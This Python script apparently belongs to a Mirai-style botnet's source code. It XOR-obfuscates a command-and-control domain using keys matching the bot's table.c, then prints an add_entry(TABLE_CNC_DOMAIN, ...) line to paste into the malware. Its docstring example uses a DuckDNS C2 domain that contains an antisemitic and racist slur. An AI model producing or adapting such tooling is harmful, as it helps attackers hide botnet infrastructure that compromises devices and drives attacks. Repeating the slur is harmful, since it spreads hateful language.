#!/usr/bin/env python3
"""
Generate XOR-obfuscated table entry for a given domain.
The table XOR keys must match those in bot/table.c

Usage: python generate_table.py <domain>
Example: python generate_table.py goynetnigga.duckdns.org
"""

import sys

# These must match table_keys[] in bot/table.c
TABLE_KEYS = [
    0x38f7f129, 0x4a2a6db, 0x3b608da0, 0x6c34dab4, 0x3a80f431, 0x2893473,
    0x1988be99, 0x5f980e32, 0x54ae03d6, 0x120f2780, 0x4205ded8, 0x5eb4e0a6,
    0x40cd53f6, 0x2e9c2a07, 0x365bfa9f, 0x7cf02ecb, 0x1a538d95, 0x7a079f4f,
    0x12dfa90f, 0x6640d384
]

def obfuscate_string(s):
    """XOR a string using all table keys (matching toggle_obf in table.c)"""
    data = bytearray(s, 'utf-8')
    for key in TABLE_KEYS:
        k1 = key & 0xff
        k2 = (key >> 8) & 0xff
        k3 = (key >> 16) & 0xff
        k4 = (key >> 24) & 0xff
        for i in range(len(data)):
            data[i] ^= k1
            data[i] ^= k2
            data[i] ^= k3
            data[i] ^= k4
    return bytes(data)

def main():
    if len(sys.argv) < 2:
        print("Usage: python generate_table.py <domain>")
        sys.exit(1)
    
    domain = sys.argv[1]
    obfuscated = obfuscate_string(domain)
    
    # Format as hex string like in table.c
    hex_str = ''.join(f'\\x{b:02x}' for b in obfuscated)
    
    print(f"Original domain: {domain}")
    print(f"Domain length:   {len(domain)}")
    print(f"\nAdd this to table.c in add_entry(TABLE_CNC_DOMAIN, ...):")
    print(f'    add_entry(TABLE_CNC_DOMAIN, "{hex_str}", {len(domain)});')
    
    # Also generate the full entry for convenience
    print(f"\nFull line to paste:")
    print(f'    add_entry(TABLE_CNC_DOMAIN, "{hex_str}", {len(domain)});')

if __name__ == '__main__':
    main()
